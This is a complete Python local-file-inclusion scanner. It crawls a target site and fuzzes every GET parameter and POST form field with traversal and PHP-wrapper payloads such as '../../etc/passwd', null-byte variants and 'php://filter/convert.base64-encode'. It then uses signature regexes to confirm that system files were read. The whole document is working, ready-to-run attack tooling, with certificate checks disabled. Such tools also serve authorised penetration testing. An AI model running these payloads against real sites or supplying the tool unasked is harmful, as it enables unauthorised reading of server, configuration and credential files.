#!/usr/bin/env python3
"""lfi_scanner.py – Lightweight Local‑File‑Inclusion discovery tool

Features
========
* **Crawler** – Finds links & HTML forms up to configurable depth.
* **Traversal Payloads** – `../../etc/passwd`, `%2e%2e/`, null‑byte (`%00`), wrapper (`php://filter/...`).
* **GET & POST‑body fuzzing** – Replaces *every* parameter value with traversal payloads.
* **Detection Heuristics**
    - Looks for well‑known file signatures: `root:.*:0:0:` (passwd), `[boot loader]` (boot.ini), `<configuration>` (web.config).
    - Detects PHP warning strings: `Warning: include`, `failed to open stream`.
* **Concurrent threads** with progress bar (tqdm).
* **CLI via argparse** (`--url`, `--depth`, `--threads`, `--timeout`, `--proxy`, `--payload-file`).
* Pure‑Python: `httpx`, `beautifulsoup4`, `tqdm`, `colorama`.

Install
=======
    pip install httpx beautifulsoup4 tqdm colorama

Example
=======
    python lfi_scanner.py --url https://target.local/page?file=home --depth 2 --threads 12
"""

import argparse, httpx, queue, threading, re, itertools
from urllib.parse import urljoin, urlsplit, urlunsplit, urlencode, parse_qsl
from bs4 import BeautifulSoup
from tqdm import tqdm
from colorama import Fore, Style

###############################################################################
# CLI
###############################################################################

def parse_args():
    p = argparse.ArgumentParser(description="LFI scanner (GET + POST)")
    p.add_argument("--url", required=True, help="Seed URL")
    p.add_argument("--depth", type=int, default=1, help="Crawl depth")
    p.add_argument("--threads", type=int, default=10)
    p.add_argument("--timeout", type=float, default=8.0)
    p.add_argument("--proxy", help="http://127.0.0.1:8080 proxy")
    p.add_argument("--payload-file", help="Custom payload list (one per line)")
    return p.parse_args()

###############################################################################
# HTTP client
###############################################################################

def make_client(args):
    proxies = {"http://": args.proxy, "https://": args.proxy} if args.proxy else None
    return httpx.Client(headers={"User-Agent": "lfi-scan/1.0"}, timeout=args.timeout, verify=False, proxies=proxies)

###############################################################################
# Crawl
###############################################################################

def crawl(client, seed, max_depth):
    out, seen, q = [], set(), queue.Queue()
    q.put((seed, 0))
    while not q.empty():
        url, d = q.get()
        if url in seen or d > max_depth:
            continue
        seen.add(url)
        try:
            r = client.get(url, follow_redirects=True)
        except Exception:
            continue
        out.append((url, r))
        if "text/html" not in r.headers.get("content-type", ""):
            continue
        soup = BeautifulSoup(r.text, "html.parser")
        for tag in soup.find_all("a", href=True):
            q.put((urljoin(url, tag["href"]), d + 1))
        for form in soup.find_all("form"):
            out.append((url, form))
    return out

###############################################################################
# Payloads & signatures
###############################################################################

def default_payloads():
    base = [
        "../../../../../../../../etc/passwd",
        "../../../../../../../../etc/passwd%00",
        "..%2f..%2f..%2f..%2fetc%2fpasswd",
        "../../../../../../../../boot.ini",
        "../../../../../../../../windows/win.ini",
        "php://filter/convert.base64-encode/resource=index.php",
    ]
    return base

SIG_REGEXES = [
    re.compile(r"root:.*:0:0:"),
    re.compile(r"\[boot loader\]", re.I),
    re.compile(r"<configuration>", re.I),
    re.compile(r"Warning: include|failed to open stream", re.I),
]

###############################################################################
# Mutators
###############################################################################

def inject_qs(url, k, v):
    parts = urlsplit(url)
    qs = dict(parse_qsl(parts.query, keep_blank_values=True))
    qs[k] = v
    return urlunsplit((*parts[:3], urlencode(qs), parts.fragment))

###############################################################################
# Globals
###############################################################################

findings = []
lock = threading.Lock()

###############################################################################
# Worker
###############################################################################

def worker(client, q, payloads, pbar):
    while True:
        try:
            item = q.get_nowait()
        except queue.Empty:
            return
        url, obj = item
        # -------- GET parameters --------
        if isinstance(obj, httpx.Response):
            params = dict(parse_qsl(urlsplit(url).query, keep_blank_values=True))
            for k in params:
                for pay in payloads:
                    test = inject_qs(url, k, pay)
                    try:
                        r = client.get(test, follow_redirects=False)
                        if any(rx.search(r.text) for rx in SIG_REGEXES):
                            with lock:
                                findings.append(("GET", test, k, pay))
                            break
                    except Exception:
                        pass
        # -------- POST forms --------
        else:
            form = obj
            method = form.get("method", "GET").upper()
            if method != "POST":
                q.task_done(); pbar.update(1); continue
            action = urljoin(url, form.get("action", url))
            inputs = {inp.get("name"): "FUZZ" for inp in form.find_all("input") if inp.get("name")}
            if not inputs:
                q.task_done(); pbar.update(1); continue
            for k in inputs:
                for pay in payloads:
                    data = inputs.copy(); data[k] = pay
                    try:
                        r = client.post(action, data=data, follow_redirects=False)
                        if any(rx.search(r.text) for rx in SIG_REGEXES):
                            with lock:
                                findings.append(("POST", action, k, pay))
                            break
                    except Exception:
                        pass
        q.task_done(); pbar.update(1)

###############################################################################
# Main
###############################################################################

if __name__ == "__main__":
    args = parse_args()
    payloads = default_payloads()
    if args.payload_file:
        with open(args.payload_file, "r", encoding="utf-8", errors="ignore") as f:
            payloads.extend([l.strip() for l in f if l.strip()])

    client = make_client(args)
    pages = crawl(client, args.url, args.depth)

    q = queue.Queue(); [q.put(p) for p in pages]
    pbar = tqdm(total=q.qsize(), desc="LFI fuzz")

    threads = [threading.Thread(target=worker, args=(client, q, payloads, pbar), daemon=True) for _ in range(args.threads)]
    [t.start() for t in threads]; [t.join() for t in threads]
    pbar.close()

    if findings:
        for typ, loc, param, payload in findings:
            print(f"{Fore.RED}[LFI] ({typ}) {loc} param={param} -> {payload}{Style.RESET_ALL}")
    else:
        print(f"{Fore.GREEN}[-] No LFI indicators found.{Style.RESET_ALL}")
